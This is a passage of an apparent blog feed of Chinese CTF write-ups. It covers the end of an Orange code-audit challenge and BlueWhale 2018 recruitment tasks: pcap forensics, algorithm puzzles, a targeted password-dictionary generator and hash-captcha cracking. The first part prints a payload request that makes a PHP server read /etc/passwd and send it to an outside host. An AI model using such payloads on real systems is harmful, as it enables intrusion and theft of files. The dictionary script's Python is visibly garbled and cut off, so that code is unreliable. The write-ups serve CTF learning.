class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">$value = substr($value, <span class="number">1</span>);</span><br><span class="line">$filename = basename($value);</span><br><span class="line">$content = file_get_contents($value);</span><br><span class="line">$contentType = $finfo-&gt;file($value);</span><br><span class="line">&#125;</span><br><span class="line">$part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">$part-&gt;type($contentType);</span><br><span class="line"><span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">$part-&gt;filename($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于此时进来的<code>$value</code>是一个字符串，所以流程会转入else中，而在else里第10行代码可以直接读取文件<br><code>$content = file_get_contents($value);</code><br>读取到的内容在<code>$content</code>变量中，而<code>$content</code>会存入<code>FormDataPart</code>里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newPart</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> FormDataPart($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再次将part加入<code>add($part)</code>，所以读取到的content会存在body中,这样就构成了一个本地文件读取漏洞，<br>Paylaod:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?url&#x3D;http:&#x2F;&#x2F;\*\*\*.\*\*\*.\*\*\*.\*\*\*&#x2F;&amp;data[a]&#x3D;@&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1</span><br><span class="line">Host: 13.230.134.135</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.67 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;13.230.134.135&#x2F;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: BD_UPN&#x3D;12314753</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会在服务器收到读取到的文件内容</p>]]></content>
    
    
    <summary type="html">Orange的一道代码审计题目，整个比赛期间的第一道web题，鄙人也认为是很难的一道题(1700多个队只解出来4个)，赛后看了PDKT的题解，发现有很多可以在代码审计中学习的地方，还用到了前段时间在BlackHat USA上新提出的PHP反序列化技术，这里将分析一波。</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhale2018年纳新题目Writeup</title>
    <link href="https://srpopty.github.io/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/"/>
    <id>https://srpopty.github.io/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/</id>
    <published>2018-10-10T12:01:47.000Z</published>
    <updated>2020-08-11T08:56:47.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="BabyForensics-200"><a href="#BabyForensics-200" class="headerlink" title="BabyForensics (200)"></a>BabyForensics (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，并且最后拿到了一份机密信息，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问这个网站使用的PHP框架是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中MYSQL服务器的用户名与密码是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中MYSQL服务器的IPV4地址是什么？</span><br><span class="line">此题仅限大一学生，大二及以上学生不计分</span><br><span class="line"></span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line"></span><br><span class="line">flag格式为&quot;flag&#123;框架名称_MYSQL用户名_MYSQL密码_MYSQL的IP地址&#125;&quot;</span><br><span class="line"></span><br><span class="line">流量包：https:&#x2F;&#x2F;**********&#x2F;resource&#x2F;BabyForensics.zip</span><br><span class="line">备用下载：http:&#x2F;&#x2F;**********&#x2F;temp&#x2F;BabyForensics.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>压缩文件下载下来后解压出来是一个pcap文件，不知道怎么打开可以Google一下<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104547.png"></p><p>找到<a href="https://www.wireshark.org/">Wireshark</a>下载安装，开始取证</p><p>pcap文件是一个很大的数据包，里面包含了许多个小的数据包，数据包根据协议也有很多的种类<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104914.png"><br>上图中的协议有ARP、TCP与HTTP，此题只需关注http的数据包</p><p>使用显示过滤器过滤出http的数据包<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/LUXR1U9KDHAFRB67XUIP.png"><br>上图中圈起来的就是“一对”数据包，上面的是请求包，下面的是响应包。每次浏览网页时，浏览器会向服务器发送一个请求，服务器收到请求后会返回一个响应。题目描述中讲到黑客最后获取了一份机密文件，所以这里进一步关注服务器的响应包，并且这个响应包应该是在最后。</p><p>从最后一个响应包，一个一个往前翻，在第734581个数据包中发现了一份配置文件，这里面有这道题的所有答案<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105723.png"><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105806.png"></p><p>PHP框架：douphp<br>MYSQL地址：10.3.3.101<br>MYSQL用户名：web<br>MYSQL密码：e667jUPvJjXHvEUv</p><blockquote><p>flag{douphp_web_e667jUPvJjXHvEUv_10.3.3.101}</p></blockquote><p>另外由于这三个题是相互关联的，所以黑客的IP地址为192.168.94.59</p><hr><h2 id="Mail1-500"><a href="#Mail1-500" class="headerlink" title="Mail1 (500)"></a>Mail1 (500)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问黑客的IP地址是多少？</span><br><span class="line">请问该系统中所使用的交换机的型号是多少？</span><br><span class="line">已知网站中使用了某种简单的Tomcat容器自身的访问控制机制，请问该网站中Tomcat认证的用户名和密码是多少？</span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line">flag格式为&quot;flag&#123;IP地址_型号_用户名_密码&#125;&quot;</span><br><span class="line">流量包：https:&#x2F;&#x2F;**********&#x2F;resource&#x2F;Mail1.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>黑客的IP地址上一问已经出来了，接着寻找交换机的型号。一个包一个包的翻肯定是不现实的，最好的办法就是用关键字搜索<br>交换机的英文是switch，在字节流中搜索一下就能找到<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112450.png"></p><p>关于Tomcat容器自身的访问控制机制，题目中给了一个<a href="https://blog.csdn.net/zzy7075/article/details/53639832">参考链接</a>，<strong>认真</strong>看完那篇文章，就能发现文章中介绍的那么多访问控制机制中，只有一个是经常在web表单认证中使用的<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112741.png"><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/3_CZVSIG0HQBL58XIHEO.png"></p><p>于是继续搜索关键词j_username与j_password，也是一下就能找到<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113108.png"></p><p>黑客的IP地址：192.168.94.59<br>交换机的型号：s5120-28p-li<br>认证用户名：system<br>认证密码：manager</p><blockquote><p>flag{192.168.94.59_s5120-28p-li_system_manager}</p></blockquote><hr><h2 id="Mail2-500"><a href="#Mail2-500" class="headerlink" title="Mail2 (500)"></a>Mail2 (500)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问管理员的邮箱是什么？</span><br><span class="line">请问黑客登录的邮箱中一共有几封邮件？</span><br><span class="line">请问黑客登录的邮箱中发送的最早的一封邮件的时间是多少？（转换成时间戳）</span><br><span class="line">Hint1: 这三道流量分析题目是相互关联的</span><br><span class="line">Hint2: 在该流量包中有两个不同的人登录过邮箱，其中一个才是黑客，另一个不用管他</span><br><span class="line"></span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line">flag格式为&quot;flag&#123;管理员邮箱_邮件数量_时间戳&#125;&quot;</span><br><span class="line">流量包：https:&#x2F;&#x2F;*********&#x2F;resource&#x2F;Mail2.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题就需要仔细分析整个流量包了，首先只需关注http的包，并且一直这三道题是相互关联的，那么在这个流量包中只需定位黑客IP地址的包即可，使用显示过滤器进行过滤，由此定位到黑客登录邮箱那附近的数据包，进行标记<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113827.png"><br>一般在登录邮箱后进入的页面会显示邮箱中所有的邮件，所以在登录数据包的后面不远处肯定能找到邮箱中的全部邮件，追踪这个包的Http字节流，在登陆之后的几个包中就能找到请求邮件的包<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114150.png"></p><p>在这个包后面的那个包中就是所有邮件的列表，将其字节流导出为html文件，之后在浏览器打开<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114512.png"></p><p>所以最早的日期为<br>2018-08-08 14:36<br>将其转换为时间戳为<br>1533710160</p><p>另外寻找管理员的邮箱只需在字节流中查找关键字“admin@”即可，非常好找<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114839.png"></p><p>管理员邮箱：<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x40;&#116;&#x65;&#115;&#116;&#46;&#x63;&#111;&#x6d;">&#97;&#100;&#109;&#105;&#110;&#x40;&#116;&#x65;&#115;&#116;&#46;&#x63;&#111;&#x6d;</a><br>邮件数量：15<br>时间戳：1533710160</p><blockquote><p>flag{admin@test.com_15_1533710160}</p></blockquote><hr><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="查找素数-150"><a href="#查找素数-150" class="headerlink" title="查找素数 (150)"></a>查找素数 (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">已知有一个等差数列，其首元素为455，公差为194, 要求找出在该数列中的第149个素数</span><br><span class="line"></span><br><span class="line">此题仅限于大一学生，大二及以上学生该题不计分</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;程序结果&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在一个很大的等差数列中找素数，很简单，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(n/<span class="number">2</span>+<span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sequence = <span class="number">455</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> check(sequence):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">149</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sequence += <span class="number">194</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sequence</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为165161</p><blockquote><p>flag{165161}</p></blockquote><hr><h2 id="下落的小球-180"><a href="#下落的小球-180" class="headerlink" title="下落的小球 (180)"></a>下落的小球 (180)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">已知有一颗最大深度为16的完全二叉树，所有叶子结点深度相同。若在根节点处放一个小球，小球会沿着根节点结点开始下落。该完全二叉树内每个结点上都有一个开关，默认全部关闭，当小球下落后，每当有小球落到一个开关上时，开关的状态会改变。当小球到达一个结点时，如果该结点上的开关关闭，则往小球向左走，否则向右走，直到到达叶子结点为止。求第12345个小球落下后的叶子结点编号。</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;结点编号&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 此题的意思是在一个深度为16的已经编号了序号的二叉树上，从根节点出下落一个小球，如果该节点为关则下一步小球向左走，否则向右走，默认全部为开，小球经过后开关取反。<br> 可以用列表构造一颗二叉树，里面包含了所有节点，之后模拟每一个小球的下落过程，直到第12345个小球为止<br>根据二叉树的性质，深度为n的二叉树最多有2^n-1个节点，所以列表大小行为2^16-1<br> 小球一开始从根节点（1号节点）开始落下每次下落一层，如果往左下落，则下一个节点的编号为当前节点编号的2倍，往右落下则为往左落下的节点编号+1<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tree = [<span class="literal">False</span>] * (<span class="number">2</span> ** <span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> ball <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">12345</span> + <span class="number">1</span>):</span><br><span class="line">    node = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">        _node = node</span><br><span class="line">        node = node * <span class="number">2</span> + <span class="number">1</span> <span class="keyword">if</span> tree[node] <span class="keyword">else</span> node * <span class="number">2</span></span><br><span class="line">        tree[_node] = <span class="keyword">not</span> tree[_node]</span><br><span class="line">        <span class="keyword">if</span> ball == <span class="number">12345</span> <span class="keyword">and</span> layer == <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">print</span> node</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后结果为36358</p><blockquote><p>flag{36358}</p></blockquote><hr><h2 id="密码生成-200"><a href="#密码生成-200" class="headerlink" title="密码生成 (200)"></a>密码生成 (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">已知某人的姓名如生日，要求制作出一份字典，准确率越高越好</span><br><span class="line">关于字典</span><br><span class="line"></span><br><span class="line">测试时我们会准备一些不会超出题目范围的密码，其中包含了姓名与生日的信息</span><br><span class="line"></span><br><span class="line">注意并不一定是全部信息，可能包含了部分信息，例如姓名为zhang san，其生日是1998 5 3，我们的测试密码为zhang199853或zs980503</span><br><span class="line"></span><br><span class="line">我们将会测试我们准备的密码是否程序生成的字典之中，并且对程序生成密码的准确性与广泛性以及生成算法做一个估计与评价</span><br><span class="line"></span><br><span class="line">语言限制为C或C++，源代码中最好包含注释，注意变量、函数等命名规范</span><br><span class="line"></span><br><span class="line">此题仅限于大一学生，大二及以上学生该题不计分</span><br><span class="line"></span><br><span class="line">程序完成后请将源码打包发送至邮箱********@outlook.com，通过后我们会将flag发送给你</span><br><span class="line"></span><br><span class="line">严禁抄袭</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">一共包含两行</span><br><span class="line">第一行为姓名的拼音，之间用空格分割</span><br><span class="line">    可以保证全部为小写并且姓名长度小于等于4个字（如&quot;诸葛孔明&quot; -&gt; &quot;zhu ge kong ming&quot; 或 &quot;洁&quot; -&gt; &quot;jie&quot; ）</span><br><span class="line">第二行为生日，之间用空格分割</span><br><span class="line">    可以保证没有前导0，并且生日是完全合理的（即不会出现9999 9999 9999这样的输入，但可能会出现483 2 9这类，483年2月9日）</span><br><span class="line">如</span><br><span class="line">    zhang san</span><br><span class="line">    1998 5 3</span><br><span class="line">输出格式</span><br><span class="line">要求输出到名为&#39;dic.txt&#39;的文件中，每行一个密码</span><br><span class="line">如</span><br><span class="line">    zhang199853</span><br><span class="line">    zhang1998053</span><br><span class="line">    zhang19980503</span><br><span class="line">    Zhang199853</span><br><span class="line">    ....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 只需要尽可能多的考虑常见的姓名与生日的组合即可，先手动分析一下，以”张三 1998 5 27”为例<br> zhang san<br> 1998 5 27  </p><ol><li>姓名与生日的组合方式只有两种<br>姓名 + 生日<br>生日 + 姓名  </li><li>姓名的组合方式有全称和缩写两种<br>其中姓名的每一个字都有可能为缩写，例如<br>zhangsan(没有缩写) -&gt; zhangs(“三”被缩写) -&gt; zsan(“张”被缩写) -&gt; zs(两个字都缩写)<br>三个字和四个字的名字同理  </li><li>姓名的大小写组合方式<br>考虑每个姓名方式的大小写情况<br>Zhangsan ZHangsan …  </li><li>姓氏单独出现<br>也有可能只有姓氏出现，比如 zhang19980521  </li><li>生日中年份的组合有两种<br>如 1998 或 98  </li><li>月与日的组合也各有两种<br>分为有前导0和每有前导0两种<br>如 521 或 0521(5有前导0)<br>假如生日为1号，则 0501(都有前导0) 或 051(5有前导0) 或 501(1有前导0) 或 51(都没有前导0)</li></ol><p>可能的结果分析清楚后，一层一层的叠加处理即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Permutations</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LetterCase</span>(<span class="params">strings</span>):</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s.upper()</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">WordCombination</span>(<span class="params">word</span>):</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name</span></span><br><span class="line">name = raw_input().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">_name = list()</span><br><span class="line">_name.append(name[<span class="number">0</span>])</span><br><span class="line">_name.append(<span class="string">&#x27;&#x27;</span>.join(name[<span class="number">1</span>:]))</span><br><span class="line">_name += Permutations.WordCombination(name)</span><br><span class="line">name = list()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> _name:</span><br><span class="line">    name += Permutations.LetterCase(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Birthday</span></span><br><span class="line">birthday = raw_input().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">year = [birthday[<span class="number">0</span>], birthday[<span class="number">0</span>][<span class="number">-2</span>:]]</span><br><span class="line">month = [birthday[<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">if</span> len(birthday[<span class="number">1</span>]) </span><br></pre></td></tr></table></figure><h2 id="验证码破解-350"><a href="#验证码破解-350" class="headerlink" title="验证码破解 (350)"></a>验证码破解 (350)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">要求编程解决哈希验证码破解</span><br><span class="line">关于哈希验证码</span><br><span class="line">观察下面一行代码</span><br><span class="line">    substr(md5(&#39;请在此输入验证码&#39;),0,6) &#x3D;&#x3D;&#x3D; &#39;dc55b0&#39;</span><br><span class="line">该行代码输要求我们入一个字符串，使得该字符串进行MD5运算之后的0到5位等于&#39;dc55b0&#39;</span><br><span class="line">该字符串称为哈希验证码</span><br><span class="line">测试时我们会准备一些不同种类且范围小于等于6位的待破解的验证码，根据破解出验证码的速度与时间以及内存的使用量对程序做一个估计与评价</span><br><span class="line"></span><br><span class="line">我们准备测试的哈希验证码种类包含: MD5、 SHA1以及SHA256</span><br><span class="line"></span><br><span class="line">提示：可以参考彩虹表以及鸽巢原理，从而大大加快验证码的破解速度</span><br><span class="line"></span><br><span class="line">语言限制为C或C++，源代码中最好包含注释，注意变量、函数等命名规范</span><br><span class="line"></span><br><span class="line">程序完成后请将源码打包发送至邮箱********@outlook.com，通过后我们会将flag发送给你</span><br><span class="line"></span><br><span class="line">此题推荐大二及以上学生，但如果大一学生完成此题则有加分奖励</span><br><span class="line"></span><br><span class="line">哈希函数（MD5,SHA1,SHA256）运算部分的代码可以参考使用互联网上的例子，其余代码严禁抄袭</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">一共三行</span><br><span class="line">第一行为要破解的验证码种类，取值范围为&quot;MD5&quot;、&quot;SHA1&quot;或&quot;SHA256&quot;，字母大写</span><br><span class="line">第二行为要破解的验证码</span><br><span class="line">    可以保证是可破解的并且长度不超过6位</span><br><span class="line">第三行为要破解的验证码范围，包括两个整形数字，之间用空格分隔</span><br><span class="line">    可以保证范围合理，不超过6位并且不会超出哈希函数结果的范围（如不会出现&quot;99 105&quot;这种），并且范围和第二行的待破解验证码的长度相等</span><br><span class="line">如</span><br><span class="line">    MD5</span><br><span class="line">    dc55b0</span><br><span class="line">    0 5</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过MD5运算后的0到5位为&quot;dc55b0&quot;</span><br><span 